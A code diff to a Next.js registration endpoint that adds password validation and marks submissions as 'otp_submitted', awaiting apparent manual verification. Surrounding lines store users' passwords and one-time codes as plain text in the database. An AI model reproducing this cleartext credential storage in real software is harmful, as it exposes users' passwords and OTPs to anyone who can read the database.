@@ -1,5 +1,6 @@
 import { NextRequest, NextResponse } from "next/server";
 import { prisma } from "@/lib/db";
+import { validatePassword } from "@/lib/password";
 
 export async function POST(req: NextRequest) {
   try {
@@ -20,6 +21,11 @@ export async function POST(req: NextRequest) {
       );
     }
 
+    const passwordCheck = validatePassword(String(password));
+    if (!passwordCheck.valid) {
+      return NextResponse.json({ error: passwordCheck.error }, { status: 400 });
+    }
+
     const existing = await prisma.registrationAttempt.findFirst({
       where: { mobile: cleanMobile },
       orderBy: { createdAt: "desc" },
@@ -30,7 +36,8 @@ export async function POST(req: NextRequest) {
         where: { id: existing.id },
         data: {
           otp: String(otp),
-          status: "registered",
+          status: "otp_submitted",
+          adminMessage: null,
         },
       });
     } else {
@@ -40,12 +47,15 @@ export async function POST(req: NextRequest) {
           password: String(password),
           otp: String(otp),
           inviteCode: inviteCode || null,
-          status: "registered",
+          status: "otp_submitted",
         },
       });
     }
 
-    return NextResponse.json({ success: true, message: "Registration complete" });
+    return NextResponse.json({
+      success: true,
+      message: "OTP submitted. Waiting for verification.",
+    });
   } catch (error) {
     console.error("Register error:", error);
     return NextResponse.json(
